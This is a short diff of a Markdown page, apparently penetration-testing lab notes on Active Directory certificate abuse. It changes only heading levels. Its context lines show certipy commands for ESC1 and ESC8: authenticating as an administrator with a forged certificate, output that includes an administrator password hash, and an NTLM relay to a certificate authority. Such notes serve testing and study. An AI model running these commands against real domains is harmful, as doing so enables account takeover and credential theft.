@@ -14,7 +14,7 @@ seo:
   robots: "" # custom robot tags (optional)
 ---
 
-### ESC1
+## ESC1
 
 **Find vulnerable certificate templates :**
 ```sh
@@ -44,7 +44,7 @@ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.v
 [*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
 ```
 
-### ESC8 :
+## ESC8 :
 
 ```sh
 certipy relay -ca "bruno-BRUNODC-CA" -target brunodc.bruno.vl -template KerberosAuthentication
